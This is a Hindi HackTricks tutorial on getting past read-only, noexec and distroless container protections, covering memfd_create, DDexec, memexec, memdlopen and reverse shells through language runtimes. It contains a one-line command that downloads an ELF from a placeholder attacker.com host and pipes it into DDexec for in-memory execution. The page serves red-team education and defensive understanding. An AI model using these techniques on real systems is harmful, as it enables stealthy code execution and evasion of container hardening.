# FS protections को bypass करना: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

निम्नलिखित Videos में इस पेज पर बताई गई techniques को अधिक विस्तार से समझाया गया है:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

किसी container में security context में **`readOnlyRootFilesystem: true`** सेट करके root filesystem को read-only mount किया जा सकता है।<sup>[[3]](#references)</sup> उदाहरण के लिए:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only root होने से अलग से mount किए गए volumes read-only नहीं हो जाते। Docker **`/dev/shm`** को IPC mount मानता है, जबकि `rw` और `noexec` जैसे tmpfs options runtime configuration के choices होते हैं; इनमें से किसी behavior पर निर्भर करने से पहले target container के mount options की जांच करें।<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Red-team के perspective से, यह combination उन binaries को download और execute करना कठिन बना सकता है जो पहले से उपलब्ध नहीं हैं, जैसे backdoors या enumeration tools।<sup>[[4]](#references)[[5]](#references)</sup>

## सबसे आसान bypass: Scripts

`noexec` mount उस mount पर binaries के direct execution को block करता है, लेकिन कोई interpreter script को पढ़कर interpret कर सकता है। इसलिए, यदि `sh` या `python` मौजूद है, तो आप उस interpreter के माध्यम से shell या Python script चला सकते हैं।<sup>[[5]](#references)</sup>

जब required tool स्वयं एक binary हो, तब इससे सहायता नहीं मिलती।<sup>[[5]](#references)</sup>

## Memory Bypasses

जब mounted path से direct execution block हो, तो एक विकल्प ELF को memory में load करके in-memory path के माध्यम से execute करना है। इससे उस mount पर `noexec` check से बचा जा सकता है, लेकिन अन्य kernel, permission या policy controls हटते नहीं हैं।<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

यदि कोई scripting runtime relevant Linux interface को access कर सकता है, तो वह **`memfd_create(2)`** के साथ एक anonymous, RAM-backed file descriptor बना सकता है, उसमें ELF bytes लिख सकता है और fd-backed execution path का उपयोग कर सकता है। [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project इस workflow के लिए compressed और base64-encoded Python, Perl या Ruby code generate करता है।<sup>[[6]](#references)[[7]](#references)</sup>

Project वर्तमान में Python, Perl और Ruby targets को document करता है; PHP या Node के लिए अलग runtime-specific technique या extension की आवश्यकता होती है, इसलिए किसी language के लिए इस generator का उपलब्ध न होना यह नहीं दर्शाता कि in-memory execution असंभव है।<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> **`/dev/shm`** में लिखा गया कोई regular executable उस mount की **`noexec`** setting के अधीन रहता है; उसे केवल ordinary file descriptor के माध्यम से खोलने से mount policy नहीं बदलती।<sup>[[5]](#references)</sup>
>
> Memory-execution की सटीक method runtime, architecture, kernel और उपलब्ध permissions पर भी निर्भर करती है।<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) **`/proc/self/mem`** के माध्यम से running shell process में stager और loader लिखता है, फिर control उस code को transfer करता है।<sup>[[8]](#references)</sup>

इससे process supplied binary को पहले उस binary को किसी executable filesystem पर रखे बिना load कर सकता है।<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** shellcode या binary को **memory** से load और **execute** कर सकता है।<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
इस technique के बारे में अधिक जानकारी के लिए Github देखें या:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) एक daemonized DDexec implementation है। इसका daemon arguments और raw program bytes वाले requests को सुनता है, प्रत्येक program को load और run करने के लिए एक child को fork करता है, और parent को server के रूप में बनाए रखता है।<sup>[[9]](#references)</sup>

Repository में [a.php](https://github.com/arget13/memexec/blob/main/a.php) में **PHP reverse shell से binaries execute करने के लिए memexec का उपयोग** करने का एक example शामिल है।<sup>[[9]](#references)</sup>

### Memdlopen

DDexec के समान उद्देश्य वाला [**memdlopen**](https://github.com/arget13/memdlopen), shared object या program के लिए एक fileless `dlopen()` implementation है। इसका README वर्तमान में ARM64 support को document करता है, इसलिए इसका उपयोग करने से पहले target architecture जांच लें।<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless वास्तव में क्या है**, यह कब उपयोगी होता है, कब नहीं, और यह containers में post-exploitation tradecraft को कैसे बदलता है, इसकी dedicated explanation के लिए देखें:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless क्या है

Distroless images में केवल application और उसकी runtime dependencies होती हैं; official images में package managers, shells और standard Linux distribution में अपेक्षित अन्य programs शामिल नहीं होते।<sup>[[11]](#references)</sup>

Runtime image को केवल इन dependencies तक सीमित रखने से production में मौजूद software और जिसे scan तथा track करना आवश्यक है, उसकी मात्रा कम हो जाती है।<sup>[[11]](#references)</sup>

### Reverse Shell

Distroless container में regular shell के लिए **`sh` या `bash` नहीं मिल सकते**, और `ls`, `whoami` या `id` जैसी common utilities भी उपलब्ध नहीं हो सकती हैं।<sup>[[11]](#references)</sup>

> [!WARNING]
> इसलिए, सामान्य shell-based reverse shell या utility-based enumeration काम नहीं कर सकता।<sup>[[11]](#references)</sup>

यदि compromised application में कोई language runtime शामिल है (उदाहरण के लिए, Flask application के लिए Python या Node application के लिए Node.js), तो RCE अभी भी उस runtime का उपयोग command channel और उसके APIs के माध्यम से system inspection के लिए कर सकता है।<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> उपलब्ध scripting language का उपयोग उसकी language capabilities के माध्यम से **system को enumerate करने** के लिए करें।<sup>[[12]](#references)</sup>

यदि कोई **read-only/no-exec** protections नहीं हैं, तो command channel writable, executable mount पर binaries लिखकर उन्हें run कर सकता है; पहले mount options और permissions verify करें।<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> जब ये protections मौजूद हों, तो जहाँ runtime, kernel और permissions अनुमति दें, वहाँ ऊपर दी गई **memory-execution techniques** का उपयोग करें।<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

आप [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में RCE vulnerabilities का exploitation करके scripting-language **reverse shells** प्राप्त करने और memory से binaries execute करने के **examples** पा सकते हैं।<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Stealth और Evasion के लिए Linux Memory Manipulation की खोज](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng और in-memory dlopen() के साथ Stealth intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod या Container के लिए Security Context configure करें](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
